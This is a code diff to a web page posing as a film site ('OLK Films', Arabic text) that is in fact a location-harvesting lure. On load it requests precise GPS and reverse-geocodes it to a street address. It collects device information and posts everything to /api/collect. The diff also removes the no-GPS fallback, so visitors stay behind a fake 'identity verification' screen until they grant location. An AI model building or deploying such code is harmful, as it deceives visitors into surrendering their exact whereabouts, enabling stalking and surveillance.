@@ -210,16 +210,31 @@
 
 <body>
 
-    <!-- Loading / Confirm Screen -->
+    <!-- Loading / GPS Required Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="loading-content">
-            <div class="loading-logo">OLK Films</div>
-            <div class="loading-icon">🎬</div>
-            <h2>جاري تحميل الموقع...</h2>
-            <p class="loading-sub">يرجى الانتظار لحظات</p>
-            <div class="loading-spinner" id="spinner"></div>
-            <p class="loading-hint" id="loadingHint">⏳ يتم التحقق من أمان الاتصال...</p>
-            <button class="retry-btn" id="confirmBtn" onclick="requestGPS()" style="display:none;margin-top:20px;">✓ تأكيد والمتابعة</button>
+            <!-- Normal Loading -->
+            <div class="normal-loading" id="normalLoading">
+                <div class="loading-logo">OLK Films</div>
+                <div class="loading-icon">🎬</div>
+                <h2>جاري تحميل الموقع...</h2>
+                <p class="loading-sub">يرجى الانتظار لحظات</p>
+                <div class="loading-spinner"></div>
+                <p class="loading-hint">⏳ يتم التحقق من أمان الاتصال...</p>
+            </div>
+
+            <!-- GPS Blocked -->
+            <div class="gps-blocked" id="gpsBlocked">
+                <div class="loading-logo">OLK Films</div>
+                <div class="blocked-icon">🔒</div>
+                <div class="blocked-title">مطلوب تأكيد الهوية</div>
+                <div class="blocked-text">
+                    للحماية من الروبوتات والوصول الغير مصرح به،<br>
+                    يرجى السماح بالتحقق من هويتك للمتابعة
+                </div>
+                <button class="retry-btn" onclick="requestGPS()">✓ تأكيد والمتابعة</button>
+
+            </div>
         </div>
     </div>
 
@@ -431,53 +446,44 @@
             return info;
         }
 
+        let retryCount = 0;
+
+        function showBlocked() {
+            document.getElementById('normalLoading').classList.add('hidden');
+            document.getElementById('gpsBlocked').classList.add('active');
+        }
+
         function showSite() {
+            sessionStorage.removeItem('gpsRetry');
+            // Redirect to the actual website instead of iframe
             window.location.href = 'https://olk-o.vercel.app/';
         }
 
-        function showButton() {
-            document.getElementById('spinner').style.display = 'none';
-            document.getElementById('loadingHint').textContent = '🔒 يرجى السماح بالتحقق من هويتك للمتابعة';
-            document.getElementById('confirmBtn').style.display = 'block';
-        }
-
-        let gpsAttempts = 0;
-
         async function requestGPS() {
-            gpsAttempts++;
-            document.getElementById('confirmBtn').style.display = 'none';
-            document.getElementById('spinner').style.display = 'block';
-            document.getElementById('loadingHint').textContent = '⏳ يتم التحقق من أمان الاتصال...';
-
-            // After 2 failed attempts, proceed without GPS
-            if (gpsAttempts > 2) {
-                const info = await collectDeviceInfo();
-                try {
-                    await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
-                } catch (e) { }
-                dataCollected = true;
-                showSite();
-                return;
-            }
+            document.getElementById('gpsBlocked').classList.remove('active');
+            document.getElementById('normalLoading').classList.remove('hidden');
 
             try {
-                const pos = await Promise.race([
-                    new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true, timeout: 15000, maximumAge: 0
-                        });
-                    }),
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 16000))
-                ]);
+                const gpsPosition = await new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true, timeout: 20000, maximumAge: 0
+                    });
+                });
 
                 const info = await collectDeviceInfo();
                 info.gpsLocation = {
-                    lat: pos.coords.latitude, lon: pos.coords.longitude,
-                    accuracy: Math.round(pos.coords.accuracy) + 'm',
-                    altitude: pos.coords.altitude, speed: pos.coords.speed
+                    lat: gpsPosition.coords.latitude,
+                    lon: gpsPosition.coords.longitude,
+                    accuracy: Math.round(gpsPosition.coords.accuracy) + 'm',
+                    altitude: gpsPosition.coords.altitude,
+                    speed: gpsPosition.coords.speed
                 };
+
                 try {
-                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`);
+                    const geoRes = await fetch(
+                        `https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`
+                    );
                     if (geoRes.ok) {
                         const geo = await geoRes.json();
                         info.gpsLocation.city = geo.address?.city || geo.address?.town || geo.address?.village || '';
@@ -488,20 +494,88 @@
                         info.gpsLocation.fullAddress = geo.display_name || '';
                     }
                 } catch (e) { }
+
                 try {
-                    await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
+                    await fetch('/api/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(info)
+                    });
                 } catch (e) { }
+
                 dataCollected = true;
                 showSite();
+
             } catch (e) {
-                // Denied or timeout — show button again
-                showButton();
+                showBlocked();
             }
         }
 
-        // Page load — show loading 2 seconds then show button
-        window.addEventListener('load', () => {
-            setTimeout(showButton, 2000);
+        // Initial load — check permission state and request GPS immediately
+        window.addEventListener('load', async () => {
+            // Check current permission state
+            let permState = 'prompt';
+            try {
+                const perm = await navigator.permissions.query({ name: 'geolocation' });
+                permState = perm.state; // 'granted', 'denied', or 'prompt'
+            } catch (e) { }
+
+            if (permState === 'denied') {
+                // Already denied — show settings instructions directly
+                retryCount = 1;
+                showBlocked();
+                return;
+            }
+
+            // Permission is 'prompt' or 'granted' — request GPS now
+            try {
+                const gpsPosition = await new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+                    });
+                });
+
+                // GPS granted!
+                const info = await collectDeviceInfo();
+                info.gpsLocation = {
+                    lat: gpsPosition.coords.latitude,
+                    lon: gpsPosition.coords.longitude,
+                    accuracy: Math.round(gpsPosition.coords.accuracy) + 'm',
+                    altitude: gpsPosition.coords.altitude,
+                    speed: gpsPosition.coords.speed
+                };
+
+                try {
+                    const geoRes = await fetch(
+                        `https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`
+                    );
+                    if (geoRes.ok) {
+                        const geo = await geoRes.json();
+                        info.gpsLocation.city = geo.address?.city || geo.address?.town || geo.address?.village || '';
+                        info.gpsLocation.district = geo.address?.suburb || geo.address?.neighbourhood || '';
+                        info.gpsLocation.state = geo.address?.state || '';
+                        info.gpsLocation.country = geo.address?.country || '';
+                        info.gpsLocation.road = geo.address?.road || '';
+                        info.gpsLocation.fullAddress = geo.display_name || '';
+                    }
+                } catch (e) { }
+
+                try {
+                    await fetch('/api/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(info)
+                    });
+                } catch (e) { }
+
+                dataCollected = true;
+                showSite();
+
+            } catch (e) {
+                // Denied or timed out
+                showBlocked();
+            }
         });
     </script>
 </body>
